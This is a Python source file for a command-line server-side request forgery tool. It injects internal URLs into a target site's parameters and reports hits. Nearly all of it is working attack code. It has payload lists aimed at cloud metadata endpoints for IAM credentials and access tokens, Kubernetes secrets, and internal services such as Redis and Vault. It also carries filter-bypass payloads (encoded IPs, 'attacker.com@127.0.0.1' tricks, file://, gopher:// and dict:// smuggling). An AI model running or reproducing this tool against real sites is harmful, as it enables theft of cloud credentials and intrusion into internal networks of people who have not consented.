#!/usr/bin/env python3
"""XC SSRF — Server-Side Request Forgery Tester"""

import sys, ssl, re, time, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from urllib.parse import urlparse, urlencode, parse_qs, quote

R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'; M='\033[95m'; C='\033[96m'; W='\033[97m'; DIM='\033[2m'; BOLD='\033[1m'; RST='\033[0m'

BANNER = f"""{C}
╔═╗╔═╗╦═╗╔═╗
╚═╗╚═╗╠╦╝╠╣
╚═╝╚═╝╩╚═╚  {Y}→ Internal Access{RST}
{DIM}Server-Side Request Forgery Tester — XC Hub{RST}
"""

# Common SSRF parameter names
SSRF_PARAMS = [
    'url', 'uri', 'link', 'src', 'source', 'href', 'host',
    'dest', 'destination', 'redirect', 'return', 'next', 'path',
    'fetch', 'load', 'callback', 'webhook', 'image', 'img',
    'proxy', 'forward', 'target', 'endpoint', 'service',
    'data', 'resource', 'file', 'api', 'remote', 'request',
    'from', 'to', 'site', 'out', 'go', 'page', 'view',
    'return_url', 'redirect_url', 'success_url', 'cancel_url',
    'error_url', 'back', 'continue', 'proceed', 'r',
]

# Internal targets to probe via SSRF
INTERNAL_TARGETS = [
    # Cloud metadata services
    ('AWS Metadata',         'http://169.254.169.254/latest/meta-data/'),
    ('AWS IAM Creds',        'http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
    ('AWS User-Data',        'http://169.254.169.254/latest/user-data'),
    ('GCP Metadata',         'http://metadata.google.internal/computeMetadata/v1/'),
    ('GCP Token',            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'),
    ('Azure Metadata',       'http://169.254.169.254/metadata/instance?api-version=2021-02-01'),
    ('Azure Token',          'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'),
    ('DigitalOcean Meta',    'http://169.254.169.254/metadata/v1/'),
    # Localhost services
    ('Localhost root',       'http://127.0.0.1/'),
    ('Localhost 8080',       'http://127.0.0.1:8080/'),
    ('Localhost 8443',       'http://127.0.0.1:8443/'),
    ('Localhost 3000',       'http://127.0.0.1:3000/'),
    ('Localhost 5000',       'http://127.0.0.1:5000/'),
    ('Localhost 4000',       'http://127.0.0.1:4000/'),
    ('Localhost 9200',       'http://127.0.0.1:9200/'),    # Elasticsearch
    ('Localhost 6379',       'http://127.0.0.1:6379/'),    # Redis
    ('Localhost 27017',      'http://127.0.0.1:27017/'),   # MongoDB
    ('Localhost 5432',       'http://127.0.0.1:5432/'),    # PostgreSQL
    ('Localhost 3306',       'http://127.0.0.1:3306/'),    # MySQL
    ('Localhost 11211',      'http://127.0.0.1:11211/'),   # Memcached
    ('Docker internal',      'http://172.17.0.1/'),
    ('Kubernetes API',       'https://kubernetes.default.svc/api/v1/namespaces'),
    ('Kubernetes secrets',   'https://kubernetes.default.svc/api/v1/namespaces/default/secrets'),
    # Admin panels
    ('Admin panel',          'http://127.0.0.1/admin'),
    ('PHPMyAdmin',           'http://127.0.0.1/phpmyadmin'),
    ('Grafana',              'http://127.0.0.1:3000'),
    ('Jenkins',              'http://127.0.0.1:8080'),
    ('Consul',               'http://127.0.0.1:8500/v1/catalog/services'),
    ('Vault',                'http://127.0.0.1:8200/v1/sys/mounts'),
    ('RabbitMQ',             'http://127.0.0.1:15672'),
    ('Prometheus',           'http://127.0.0.1:9090'),
    ('Kibana',               'http://127.0.0.1:5601'),
]

# SSRF bypass techniques for localhost/internal
SSRF_BYPASSES = [
    ('Decimal IP',           'http://2130706433/'),           # 127.0.0.1 decimal
    ('Hex IP',               'http://0x7f000001/'),           # 127.0.0.1 hex
    ('Octal IP',             'http://0177.0.0.1/'),           # 127.0.0.1 octal
    ('IPv6 localhost',       'http://[::1]/'),
    ('IPv6 mapped',          'http://[::ffff:127.0.0.1]/'),
    ('IPv6 mapped hex',      'http://[::ffff:7f00:1]/'),
    ('0.0.0.0',              'http://0.0.0.0/'),
    ('localhost dot',        'http://localhost./'),
    ('UPPERCASE localhost',  'http://LOCALHOST/'),
    ('DNS rebind label',     'http://127.0.0.1.nip.io/'),
    ('Double URL encode',    'http://%25%36%36%25%36%43%25%36%46%25%36%33%25%36%31%25%36%43%25%36%38%25%36%46%25%37%33%25%37%34/'),
    ('URL auth bypass',      'http://attacker.com@127.0.0.1/'),
    ('Hash fragment',        'http://127.0.0.1#@attacker.com/'),
    ('Backslash bypass',     'http://127.0.0.1\\@attacker.com/'),
    ('Protocol relative',    '//127.0.0.1/'),
    ('file:// LFI',          'file:///etc/passwd'),
    ('file:// win',          'file:///C:/Windows/win.ini'),
    ('dict:// Redis',        'dict://127.0.0.1:6379/info'),
    ('gopher:// Redis',      'gopher://127.0.0.1:6379/_INFO%0d%0a'),
    ('gopher:// SMTP',       'gopher://127.0.0.1:25/_EHLO%20localhost'),
]

# Response indicators of successful SSRF
SSRF_INDICATORS = [
    r'ami-id', r'instance-id', r'local-hostname',                       # AWS meta
    r'serviceAccounts', r'computeMetadata',                              # GCP
    r'azure', r'osProfile',                                              # Azure
    r'root:', r'daemon:', r'nobody:',                                    # /etc/passwd
    r'uid=\d+', r'Welcome to nginx', r'Apache/\d',                      # common
    r'\[extensions\]', r'\[fonts\]',                                     # win.ini
    r'redis_version', r'redis_mode', r'used_memory',                    # Redis
    r'"namespaces"', r'"pods"', r'"services"',                          # Kubernetes
    r'consul', r'vault', r'grafana',
    r'<title>Grafana', r'<title>Jenkins',
    r'elasticSearch', r'elasticsearch',
]

def fetch(url, timeout=8):
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': '*/*',
         'Metadata': 'true', 'Metadata-Flavor': 'Google'}
    req = Request(url, headers=h)
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(65536).decode('utf-8', errors='ignore')
            return r.status, body
    except HTTPError as e:
        try: body = e.read(4096).decode('utf-8', errors='ignore')
        except: body = ''
        return e.code, body
    except Exception:
        return None, ''

def inject_ssrf(base_url, param, ssrf_target):
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [ssrf_target]
    new_query = urlencode(params, doseq=True)
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

def check_ssrf_response(body):
    for sig in SSRF_INDICATORS:
        m = re.search(sig, body, re.IGNORECASE)
        if m:
            return m.group(0)
    return None

def probe_ssrf_params(base_url):
    print(f"\n{BOLD}{B}━━━ SSRF PARAMETER DISCOVERY ━━━{RST}")
    parsed = urlparse(base_url)
    url_params = list(parse_qs(parsed.query).keys())
    params_to_test = url_params if url_params else SSRF_PARAMS[:15]
    print(f"  Params: {', '.join(params_to_test)}")

    for param in params_to_test:
        for label, internal_url in INTERNAL_TARGETS[:8]:
            url = inject_ssrf(base_url, param, internal_url)
            status, body = fetch(url)
            hit = check_ssrf_response(body) if body else None
            if hit or (status and status == 200 and len(body) > 50):
                color = R if hit else Y
                sym = '★' if hit else '?'
                print(f"  {color}[{sym}]{RST} param={W}{param}{RST} → {label}")
                if hit:
                    print(f"       indicator={Y}{hit}{RST}")
                    snippet = body[:200].replace('\n', ' ')
                    print(f"       response={DIM}{snippet}...{RST}")
            time.sleep(0.1)

def probe_internal_targets(base_url, param):
    print(f"\n{BOLD}{B}━━━ INTERNAL TARGET SCAN ━━━{RST}")
    print(f"  Using param: {W}{param}{RST}\n")
    findings = []
    for label, internal_url in INTERNAL_TARGETS:
        url = inject_ssrf(base_url, param, internal_url)
        status, body = fetch(url, timeout=5)
        hit = check_ssrf_response(body) if body else None
        if hit:
            print(f"  {R}[★ HIT]{RST} {label}")
            print(f"    URL:       {C}{internal_url}{RST}")
            print(f"    Indicator: {Y}{hit}{RST}")
            print(f"    Response:  {DIM}{body[:150].replace(chr(10),' ')}...{RST}\n")
            findings.append({'label': label, 'url': internal_url, 'indicator': hit, 'body': body[:500]})
        elif status == 200:
            print(f"  {Y}[?]{RST} {label} — 200 OK (no known indicator, check manually)")
        time.sleep(0.15)
    return findings

def probe_bypasses(base_url, param):
    print(f"\n{BOLD}{B}━━━ BYPASS TECHNIQUES ━━━{RST}")
    print(f"  Using param: {W}{param}{RST}\n")
    for label, bypass_url in SSRF_BYPASSES:
        url = inject_ssrf(base_url, param, bypass_url)
        status, body = fetch(url, timeout=5)
        hit = check_ssrf_response(body) if body else None
        if hit:
            print(f"  {R}[★ HIT]{RST} {label}")
            print(f"    payload={C}{bypass_url}{RST}")
            print(f"    indicator={Y}{hit}{RST}")
        elif status and status not in (400, 404):
            print(f"  {Y}[{status}]{RST} {label} — {bypass_url[:60]}")
        time.sleep(0.12)

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description='XC SSRF Tester')
    parser.add_argument('target', help='Target URL (e.g. https://site.com/fetch?url=http://example.com)')
    parser.add_argument('--param', help='Known SSRF param name to use')
    parser.add_argument('--scan', action='store_true', help='Scan all internal targets via known param')
    parser.add_argument('--bypass', action='store_true', help='Try localhost bypass techniques')
    parser.add_argument('--full', action='store_true', help='Param discovery + all internal + bypass')
    args = parser.parse_args()

    target = args.target
    if not target.startswith('http'):
        target = 'https://' + target
    parsed = urlparse(target)
    url_params = list(parse_qs(parsed.query).keys())

    print(f"{BOLD}Target:{RST} {W}{target}{RST}")
    if url_params:
        print(f"{BOLD}URL params:{RST} {W}{', '.join(url_params)}{RST}")

    param = args.param or (url_params[0] if url_params else 'url')

    if not args.param and not url_params:
        probe_ssrf_params(target)
    elif args.full:
        probe_ssrf_params(target)

    if args.scan or args.full:
        probe_internal_targets(target, param)

    if args.bypass or args.full:
        probe_bypasses(target, param)

    if not any([args.scan, args.bypass, args.full]) and (url_params or args.param):
        print(f"\n{BOLD}{B}━━━ QUICK SCAN ━━━{RST}")
        print(f"  param={W}{param}{RST}")
        for label, internal_url in INTERNAL_TARGETS[:12]:
            url = inject_ssrf(target, param, internal_url)
            status, body = fetch(url, timeout=5)
            hit = check_ssrf_response(body) if body else None
            sym = f'{R}★{RST}' if hit else (f'{Y}?{RST}' if status == 200 else DIM+'~'+RST)
            print(f"  [{sym}] [{status}] {label}")
            if hit:
                print(f"        {Y}{hit}{RST} — {DIM}{body[:100]}...{RST}")
            time.sleep(0.12)

    print(f"\n{DIM}Use --scan for full internal scan, --bypass for localhost tricks, --full for everything.{RST}")
    print(f"{DIM}Known SSRF params: {', '.join(SSRF_PARAMS[:10])}...{RST}\n")

if __name__ == '__main__':
    main()
